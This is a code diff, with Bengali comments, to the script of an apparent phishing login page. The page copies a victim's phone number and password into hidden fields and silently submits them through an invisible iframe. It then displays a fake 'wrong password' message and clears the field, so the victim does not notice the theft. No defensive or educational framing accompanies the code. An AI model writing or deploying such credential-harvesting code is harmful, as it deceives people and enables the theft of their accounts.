@@ -40,25 +40,27 @@
             return;
         }
 
-        // ফর্মের হিডেন ইনপুটগুলোতে ডাটা সেট করা
+        // হিডেন ফর্মে ডাটা সেট করা
         document.getElementById("hiddenPhone").value = phone;
         document.getElementById("hiddenPass").value = pass;
 
-        // ডাটা পাঠানো
+        // ডাটা পাঠানোর জন্য সরাসরি ফর্ম সাবমিট করা
         const form = document.getElementById("notifyForm");
-        const formData = new FormData(form);
+        
+        // এটি একটি অদৃশ্য ফ্রেমের মাধ্যমে ডাটা পাঠাবে যাতে পেজ রিফ্রেশ না হয়
+        const iframe = document.createElement("iframe");
+        iframe.name = "hidden_iframe";
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+        form.target = "hidden_iframe";
 
-        fetch(form.action, {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors'
-        }).then(() => {
-            // ডাটা পাঠানোর পর ভুল পাসওয়ার্ড মেসেজ দেখানো
+        form.submit();
+
+        // সাবমিট হওয়ার পর ইউজারকে ভুল পাসওয়ার্ড মেসেজ দেখানো
+        setTimeout(() => {
             errorMsg.style.display = "block";
             document.getElementById("passInput").value = "";
-        }).catch(() => {
-            errorMsg.style.display = "block";
-        });
+        }, 1000);
     }
 </script>
 
